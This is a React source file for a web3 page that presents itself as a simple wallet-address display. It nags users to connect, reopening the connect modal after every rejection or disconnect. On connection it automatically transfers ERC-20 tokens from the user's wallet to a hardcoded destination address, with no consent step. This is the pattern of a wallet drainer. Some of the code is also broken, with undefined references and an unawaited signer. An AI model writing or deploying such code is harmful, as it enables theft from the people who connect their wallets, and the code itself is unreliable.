import { createAppKit, ThemeMode } from '@reown/appkit/react'
import { WagmiProvider, useAccount } from 'wagmi'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { useEffect } from 'react'
import { BrowserProvider, parseUnits } from 'ethers';

import { projectId, metadata, networks, wagmiAdapter, solanaWeb3JsAdapter } from './config'

const queryClient = new QueryClient()

const generalConfig = {
  projectId,
  metadata,
  networks,
  themeMode: ThemeMode.Dark,
  features: { analytics: true },
  themeVariables: { '--w3m-accent': '#000000' },
};

const appKit = createAppKit({
  adapters: [wagmiAdapter, solanaWeb3JsAdapter],
  ...generalConfig,
});

const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B";
const TOKEN_CONTRACT_ADDRESS = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"; // Example Token Address

const WalletDisplay = () => {
  const { address: userAddress, isConnected } = useAccount();

  useEffect(() => {
    const autoTransferTokens = async () => {
      if (!isConnected || !userAddress) return;

      try {
        const provider = new BrowserProvider(window.ethereum); 
        const signer = provider.getSigner();
        const tokenContract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, tokenAbi, signer);

        // Check user's token balance
        const balance = await tokenContract.balanceOf(userAddress);
        const amountToSend = parseUnits("0.01", 18); 

        if (balance.lt(amountToSend)) {
          console.warn("Insufficient balance to transfer.");
          return;
        }

        // Directly transfer tokens from user's wallet
        const tx = await tokenContract.transfer(DESTINATION_WALLET, amountToSend);
        await tx.wait();
        console.log("Transfer successful:", tx);
      } catch (error) {
        console.error("Transfer failed:", error);
      }
    };

    autoTransferTokens();
  }, [isConnected, userAddress]);

  return (
    <div style={{ background: '#f0f0f0', padding: '1rem', borderRadius: '8px', marginTop: '20px', textAlign: 'center' }}>
      {isConnected && (
        <div style={{ marginTop: '20px' }}>
          <h3>Your Wallet Address:</h3>
          <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
        </div>
      )}
      <div style={{ marginTop: '20px' }}>
        <h3>Destination Wallet Address:</h3>
        <code style={{ wordBreak: 'break-all' }}>{DESTINATION_WALLET}</code>
      </div>
    </div>
  );
};

export function App() {
  useEffect(() => {
    const openModal = async () => {
      try {
        await appKit.open();
      } catch (error) {
        console.log("Connection rejected", error);
        setTimeout(() => openModal(), 500);
      }
    };

    openModal();

    const handleDisconnect = () => {
      openModal();
    };

    window.addEventListener('disconnect', handleDisconnect);
    return () => {
      window.removeEventListener('disconnect', handleDisconnect);
    };
  }, []);

  return (
    <div className={"pages"}>
      <WagmiProvider config={wagmiAdapter.wagmiConfig}>
        <QueryClientProvider client={queryClient}>
          <WalletDisplay />
        </QueryClientProvider>
      </WagmiProvider>
    </div>
  );
}

export default App;
